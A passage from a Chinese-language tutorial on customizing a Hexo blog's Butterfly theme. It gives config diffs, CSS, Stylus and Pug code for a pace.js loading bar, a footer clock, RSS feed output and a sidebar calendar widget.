就内置了 pace，但我配置时未能达到预期结果，遂另引入。引入文件后建议把<code>preloader:</code>设置成<code>enable: false</code>，防止冲突（我先前保持这里启用时加载正常，升级完主题至 4.11.0 后不关的话进度条会很奇怪，原因未知，可能是个例）。</font></p></blockquote><p>回到<code>_config.butterfly.yml</code>找到<code>preloader</code>，将<code>enable: false</code>改为 true。你要不放心的话在此段的 pace_css_url 后修改</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">preloader:</span><br><span class="line"><span class="deletion">-  enable: false</span></span><br><span class="line"><span class="addition">+  enable: true</span></span><br><span class="line">  ...</span><br><span class="line"><span class="deletion">-  pace_css_url:</span></span><br><span class="line"><span class="addition">+  pace_css_url: https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace-theme-default.min.css</span></span><br></pre></td></tr></table></figure><p>找到<code>inject:</code>中<code>bottom:</code>，添加 js：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bottom:</span><br><span class="line">  ...</span><br><span class="line"><span class="addition">+  - &lt;script data-pjax src=&quot;https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>随后在<code>【Blogroot】/themes/butterfly/sources/css</code>中新建一个 css 文件（也可以使用前文提到的 custom.css），引入方法同前文。在这个文件中添加</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.pace</span> &#123;</span><br><span class="line">  -webkit-<span class="attribute">pointer-events</span>: none;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">  -webkit-<span class="attribute">user-select</span>: none;</span><br><span class="line">  -moz-<span class="attribute">user-select</span>: none;</span><br><span class="line">  <span class="attribute">user-select</span>: none;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">2000</span>;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">margin</span>: auto;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">4rem</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#eaecf2</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> <span class="number">#e3e8f7</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.pace-inactive</span> <span class="selector-class">.pace-progress</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transition</span>: .<span class="number">3s</span> ease-in</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.pace</span> <span class="selector-class">.pace-progress</span> &#123;</span><br><span class="line">  -webkit-<span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  -moz-<span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  -ms-<span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  -o-<span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  -webkit-<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  -moz-<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  -ms-<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  -o-<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">2000</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(-<span class="number">45deg</span>, <span class="number">#ee7752</span>, <span class="number">#e73c7e</span>, <span class="number">#23a6d5</span>, <span class="number">#23d5ab</span>);</span><br><span class="line">  <span class="attribute">animation</span>: gradient <span class="number">1.5s</span> ease infinite;</span><br><span class="line">  <span class="attribute">background-size</span>: <span class="number">200%</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.pace</span><span class="selector-class">.pace-inactive</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transition</span>: .<span class="number">3s</span>;</span><br><span class="line">  <span class="attribute">top</span>: -<span class="number">8px</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> gradient &#123;</span><br><span class="line"><span class="number">0%</span> &#123;</span><br><span class="line">  <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">50%</span> &#123;</span><br><span class="line">  <span class="attribute">background-position</span>: <span class="number">100%</span> <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">100%</span> &#123;</span><br><span class="line">  <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hexo 三连，完成</p><h4 id="页脚电子钟与-GitHub-徽标">页脚电子钟与 GitHub 徽标</h4><p>Native JS Timer（页脚电子钟）：<a href="https://akilar.top/posts/b941af/" rel="external nofollow noreferrer">https://akilar.top/posts/b941af/</a></p><p>Add Github Badge（自定义添加 GitHub 徽标）：<a href="https://akilar.top/posts/e87ad7f8/" rel="external nofollow noreferrer">https://akilar.top/posts/e87ad7f8/</a></p><p>注：控制建站时间（即开始时间）的代码在<code>runtime.js</code>中，如需更改，可打开其 CDN 地址将其保存至本地，修改起始日期（大约在这个文件的第二行）为自己的后引入。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//省略。..</span></span><br><span class="line"><span class="keyword">let</span> create_time = <span class="title class_">Math</span>.<span class="title function_">round</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&#x27;2022-10-1 00:00:00&#x27;</span>).<span class="title function_">getTime</span>() / <span class="number">1000</span>); <span class="comment">//例：显示时间为 2022 年 10 月 1 日零时零分零秒距今过去的时间。但这样的日期格式会有问题，下面将给出解决方法。</span></span><br><span class="line"><span class="comment">//省略。..</span></span><br></pre></td></tr></table></figure><p>此时你可能会发现，这个日期格式化方式在 iOS 平台中部分浏览器无法正确显示时间，需要修改为下方格式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//省略。..</span></span><br><span class="line"><span class="keyword">let</span> create_time = <span class="title class_">Math</span>.<span class="title function_">round</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&#x27;2022/10/1 00:00:00&#x27;</span>).<span class="title function_">getTime</span>() / <span class="number">1000</span>);</span><br><span class="line"><span class="comment">//省略。..</span></span><br></pre></td></tr></table></figure><h4 id="RSS">RSS</h4><p>在【Blogroot】下打开 Git，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure><p>然后打开<code>_config.yml</code>，在末尾新起一行添加</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## RSS</span></span><br><span class="line"><span class="attr">feed:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">## 是否启用插件</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">atom</span> <span class="comment">## RSS 的类型，有 atom 和 rss2 两个选项，使用默认 atom 就好了</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">atom.xml</span> <span class="comment">## 文件路径，默认是 atom.xml/rss2.xml</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">15</span> <span class="comment">## 展示文章的数量，使用 0 或 false 代表展示全部</span></span><br><span class="line">  <span class="attr">hub:</span> <span class="comment">## 这个我没用上，根据官网，空着就行</span></span><br><span class="line">  <span class="attr">content:</span> <span class="comment">## 在 RSS 文件中是否包含内容 , 有 3 个值 true/false/默认不填 (false)</span></span><br><span class="line">  <span class="attr">content_limit:</span> <span class="number">100</span> <span class="comment">## 指定内容的长度作为摘要，仅仅在上面 content 设置为 false 和没有自定义的描述出现</span></span><br><span class="line">  <span class="attr">content_limit_delim:</span> <span class="string">&#x27; &#x27;</span> <span class="comment">## 上面截取描述的分隔符，截取内容是以指定的这个分隔符作为截取结束的标志。在达到规定的内容长度之前最后出现的这个分隔符之前的内容，防止从中间截断。</span></span><br><span class="line">  <span class="attr">order_by:</span> <span class="string">-date</span> <span class="comment">## 采用日期进行排序</span></span><br><span class="line">  <span class="attr">icon:</span> <span class="string">icon.png</span> <span class="comment">## 给 rss 链接配置 icon</span></span><br><span class="line">  <span class="attr">autodiscovery:</span> <span class="literal">true</span> <span class="comment">## 自动发现提要</span></span><br><span class="line">  <span class="attr">template:</span> <span class="comment">## 给 rss 文章配置模板</span></span><br></pre></td></tr></table></figure><p>【注：<code>_config.yml</code>文件前面约 16 行左右 url 处需填写你博客的地址，详见“优化链接”】</p><blockquote><p><font color="orange">【注：主题配置文件中不添加下面这一段貌似不影响什么】</font></p></blockquote><p><s>回到<code>_config.butterfly.yml</code>，新起一行，添加</s></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">rss:</span> <span class="string">/atom.xml</span></span><br></pre></td></tr></table></figure><p>还是这个文件，找到 social 一栏，添加</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">social:</span><br><span class="line">  ## fab fa-github: https://github.com/xxxxx || Github || &#x27;#24292e&#x27;</span><br><span class="line">  ## fas fa-envelope: mailto:xxxxxx@gmail.com || Email || &#x27;#4a7dbe&#x27;</span><br><span class="line"><span class="addition">+  fas fa-rss: https://www.example.com/atom.xml ## 在右侧作者头像下面添加 RSS 按钮</span></span><br></pre></td></tr></table></figure><p>hexo 三连，完成</p><h4 id="侧边栏日历">侧边栏日历</h4><p>参考<a href="https://moonshuo.cn/posts/50269.html" rel="external nofollow noreferrer">https://moonshuo.cn/posts/50269.html</a></p><p>在<code>【Blogroot】</code>目录下打开 Git，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm -registry=https://registry.npm.taobao.org ## 你如果已经安装过 cnpm 则可忽略这条</span><br><span class="line">cnpm install --save git://github.com/howiefh/hexo-generator-calendar.git</span><br></pre></td></tr></table></figure><p>从<a href="https://github.com/pengloo53/Hexo-theme-light_cn/tree/master/source/js" rel="external nofollow noreferrer">https://github.com/pengloo53/Hexo-theme-light_cn/tree/master/source/js</a>下载<code>calendar.js</code>和<code>language.js</code>两个文件，将其保存到<code>【Blogroot】/themes/Butterfly/source/js/</code>目录下。保存后请使用编辑器打开<code>calendar.js</code>文件，在结尾<code>&#125;(jQuery));</code>前添加</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">    root: &#x27;/calendar/&#x27;,</span><br><span class="line">    url: &#x27;/calendar.json&#x27;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line"><span class="addition">+  $(document).ready(function () &#123;</span></span><br><span class="line"><span class="addition">+     $(&#x27;#calendar&#x27;).aCalendar(&#x27;zh-CN&#x27;);//&#x27;zh-CN&#x27;请根据自己博客的语言选择</span></span><br><span class="line"><span class="addition">+  &#125;);</span></span><br><span class="line"></span><br><span class="line">&#125;(jQuery));</span><br></pre></td></tr></table></figure><p>之后打开<code>_config.butterfly.yml</code>，找到<code>inject:</code>，在<code>bottom:</code>后添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bottom:</span><br><span class="line">  ...</span><br><span class="line">+ - &lt;script src=&quot;/js/jquery.min.js&quot;&gt;&lt;/script&gt; ## 这段没引入的自行添加，而且需在 bottom 后第一个引入，否则可能出现加载出错问题</span><br><span class="line">......</span><br><span class="line">+ - &lt;script data-pjax src=&quot;/js/calendar.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">+ - &lt;script data-pjax src=&quot;/js/languages.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>在<code>【Blogroot】/themes/Butterfly/source/css/_layout/</code>目录下新建<code>calendar.styl</code>文件，内容如下</p><figure class="highlight styl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#calendar</span></span><br><span class="line">  <span class="selector-tag">a</span></span><br><span class="line">    <span class="attribute">text-decoration</span> none</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.cal-head</span></span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">15px</span></span><br><span class="line">  <span class="attribute">position</span> relative</span><br><span class="line">  <span class="attribute">height</span> <span class="number">20px</span></span><br><span class="line">  <span class="attribute">padding</span> <span class="number">8px</span> <span class="number">6px</span> <span class="number">2px</span> <span class="number">6px</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.cal-prev</span>,<span class="selector-class">.cal-next</span></span><br><span class="line">  <span class="attribute">position</span> absolute</span><br><span class="line">  <span class="attribute">top</span> <span class="number">9px</span></span><br><span class="line">  <span class="attribute">width</span> <span class="number">16px</span></span><br><span class="line">  <span class="attribute">height</span> <span class="number">18px</span></span><br><span class="line">  <span class="attribute">padding</span> <span class="number">3px</span> <span class="number">4px</span></span><br><span class="line">  <span class="attribute">border</span> <span class="number">1px</span> solid transparent</span><br><span class="line">  <span class="attribute">color</span> <span class="number">#333</span></span><br><span class="line">  <span class="attribute">outline</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.cal-prev</span></span><br><span class="line">  <span class="attribute">left</span> <span class="number">8px</span></span><br><span class="line">  <span class="selector-pseudo">&amp;:before</span></span><br><span class="line">    <span class="attribute">border-right</span> <span class="number">9px</span> solid <span class="number">#333</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.cal-next</span></span><br><span class="line">  <span class="attribute">right</span> <span class="number">8px</span></span><br><span class="line">  <span class="selector-pseudo">&amp;:before</span></span><br><span class="line">    <span class="attribute">border-left</span> <span class="number">9px</span> solid <span class="number">#333</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.cal-prev</span><span class="selector-pseudo">:before</span>,<span class="selector-class">.cal-next</span><span class="selector-pseudo">:before</span></span><br><span class="line">  <span class="attribute">content</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="attribute">display</span> block</span><br><span class="line">  <span class="attribute">width</span> <span class="number">0</span></span><br><span class="line">  <span class="attribute">height</span> <span class="number">0</span></span><br><span class="line">  <span class="attribute">border-top</span> <span class="number">5px</span> solid transparent</span><br><span class="line">  <span class="attribute">border-bottom</span> <span class="number">5px</span> solid transparent</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.cal-title</span></span><br><span class="line">  <span class="attribute">width</span> <span class="number">100px</span></span><br><span class="line">  <span class="attribute">margin</span> <span class="number">0</span> auto</span><br><span class="line">  <span class="attribute">color</span> <span class="number">#333</span></span><br><span class="line">  <span class="attribute">font</span> bold <span class="number">14px</span>/<span class="number">18px</span> Arial</span><br><span class="line">  <span class="attribute">text-align</span> center</span><br><span class="line">  <span class="selector-tag">a</span></span><br><span class="line">    <span class="attribute">border</span> <span class="number">1px</span> solid transparent</span><br><span class="line">    <span class="attribute">color</span> <span class="number">#9f9f9f</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.cal</span>,</span><br><span class="line"><span class="selector-class">.cal</span> <span class="selector-tag">th</span>,</span><br><span class="line"><span class="selector-class">.cal</span> <span class="selector-tag">td</span></span><br><span class="line">  <span class="attribute">border</span> <span class="number">1px</span> solid <span class="number">#d1d1d1</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.cal</span></span><br><span class="line">  <span class="attribute">display</span>: table</span><br><span class="line">  <span class="attribute">border-collapse</span> separate</span><br><span class="line">  <span class="attribute">border-spacing</span> <span class="number">0</span></span><br><span class="line">  <span class="attribute">border-width</span> <span class="number">1px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1px</span></span><br><span class="line">  <span class="attribute">table-layout</span> fixed</span><br><span class="line">  <span class="attribute">width</span> <span class="number">100%</span></span><br><span class="line">  <span class="attribute">margin</span> <span class="number">0</span></span><br><span class="line">  <span class="selector-tag">th</span></span><br><span class="line">    <span class="attribute">background</span> <span class="number">#9f9f9f</span></span><br><span class="line">    <span class="attribute">color</span> <span class="number">#fff</span></span><br><span class="line">    <span class="attribute">border-width</span> <span class="number">0</span> <span class="number">1px</span> <span class="number">1px</span> <span class="number">0</span></span><br><span class="line">    <span class="attribute">font-weight</span> <span class="number">700</span></span><br><span class="line">  <span class="selector-tag">td</span></span><br><span class="line">    <span class="attribute">border-width</span> <span class="number">0</span> <span class="number">1px</span> <span class="number">1px</span> <span class="number">0</span></span><br><span class="line">  <span class="selector-tag">tbody</span></span><br><span class="line">    <span class="selector-tag">a</span></span><br><span class="line">      <span class="attribute">background-color</span> <span class="number">#007acc</span></span><br><span class="line">      <span class="attribute">color</span> <span class="number">#fff</span></span><br><span class="line">      <span class="attribute">display</span> block</span><br><span class="line">      <span class="attribute">font-weight</span> <span class="number">700</span></span><br><span class="line">    <span class="selector-class">.cal-today</span></span><br><span class="line">      <span class="attribute">background-color</span> <span class="number">#66ecfd</span></span><br><span class="line">      <span class="attribute">color</span> <span class="number">#fff</span></span><br><span class="line">  <span class="selector-class">.cal-gray</span></span><br><span class="line">    <span class="attribute">color</span> <span class="number">#bbb8b8</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&#x27;dark&#x27;</span>]</span> <span class="selector-class">.cal</span> <span class="selector-class">.cal-gray</span></span><br><span class="line">  <span class="attribute">color</span> <span class="number">#505050</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.cal</span> <span class="selector-tag">th</span>,</span><br><span class="line"><span class="selector-class">.cal</span> <span class="selector-tag">td</span></span><br><span class="line">  <span class="attribute">font-weight</span> normal</span><br><span class="line">  <span class="attribute">line-height</span> <span class="number">2.5625</span></span><br><span class="line">  <span class="attribute">padding</span> <span class="number">0</span></span><br><span class="line">  <span class="attribute">text-align</span> center</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&#x27;dark&#x27;</span>]</span> <span class="selector-class">.cal</span> <span class="selector-class">.cal-foot</span></span><br><span class="line">  <span class="attribute">color</span> <span class="number">#9f9f9f</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.cal</span> <span class="selector-class">.cal-foot</span></span><br><span class="line">  <span class="attribute">color</span> <span class="number">#2ca6cb</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.cal-title</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-class">.cal-prev</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-class">.cal-next</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-class">.cal</span> <span class="selector-class">.cal-foot</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-class">.cal</span> <span class="selector-class">.cal-foot</span><span class="selector-pseudo">:focus</span>,</span><br><span class="line"><span class="selector-class">.cal</span> <span class="selector-tag">tbody</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-class">.cal</span> <span class="selector-tag">tbody</span> <span class="selector-tag">a</span><span class="selector-pseudo">:focus</span></span><br><span class="line">  <span class="attribute">background-color</span> <span class="number">#686868</span></span><br><span class="line">  <span class="attribute">color</span> <span class="number">#fff</span></span><br><span class="line">  <span class="attribute">cursor</span> pointer</span><br></pre></td></tr></table></figure><p>在<code>【Blogroot】/themes/Butterfly/layout/includes/widget/</code>目录下新建<code>card_calendar.pug</code>文件，编辑内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if theme.aside.card_calendar.enable</span><br><span class="line">  .card-widget.card-calendar</span><br><span class="line">    .card-content</span><br><span class="line">      .item-headline</span><br><span class="line">        i.fas.fa-calendar</span><br><span class="line">        span= _p(&#x27;日历&#x27;)</span><br><span class="line">      div#calendar.widget</span><br></pre></td></tr></table></figure><p>在<code>【Blogroot】/themes/Butterfly/layout/includes/widget/</code>目录下找到并使用编辑器打开<code>index.pug</code>文件，在你认为合适的位置插入以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if theme.aside.card_calendar</span><br><span class="line">        !=partial(&#x27;includes/widget/card_calendar&#x27;, &#123;&#125;, &#123;cache:theme.fragment_cache&#125;)</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">          include ./card_post_toc.pug</span><br><span class="line"><span class="addition">+        !=partial(&#x27;includes/widget/card_calendar&#x27;, &#123;&#125;, &#123;cache: true&#125;)</span></span><br><span class="line">        !=partial(&#x27;includes/widget/card_recent_post&#x27;, &#123;&#125;, &#123;cache: true&#125;)</span><br><span class="line">        !=partial(&#x27;includes/widget/card_ad&#x27;, &#123;&#125;, &#123;cache: true&#125;)</span><br><span class="line">  else</span><br><span class="line">    //- page</span><br><span class="line">    !=partial(&#x27;includes/widget/card_author&#x27;, &#123;&#125;, &#123;cache: true&#125;)</span><br><span class="line">    !=partial(&#x27;includes/widget/card_announcement&#x27;, &#123;&#125;, &#123;cache: true&#125;)</span><br><span class="line"><span class="addition">+    !=partial(&#x27;includes/widget/card_calendar&#x27;, &#123;&#125;, &#123;cache: true&#125;)</span></span><br><span class="line">    !=partial(&#x27;includes/widget/card_top_self&#x27;, &#123;&#125;, &#123;cache: true&#125;)</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>回到<code>_config.butterfly.yml</code>配置文件，找到<code>aside:</code>段落，在这段结尾添加相关内容，修改完应如下（calendar 一段，缩进与前部分配置齐平，其相对关系应为 aside 内）</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="addition">+  card_calendar:</span></span><br><span class="line"><span class="addition">+    enable: true</span></span><br><span class="line"></span><br><span class="line">## busuanzi count for PV / UV in site</span><br><span class="line">## 訪問人數</span><br><span class="line">busuanzi:</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>打开<code>_config.yml</code>配置文件，新起一段添加：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">......</span></span><br><span class="line"><span class="attr">calendar:</span></span><br><span class="line">  <span class="attr">single:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">root:</span> <span class="string">calendar/</span></span><br><span class="line"><span 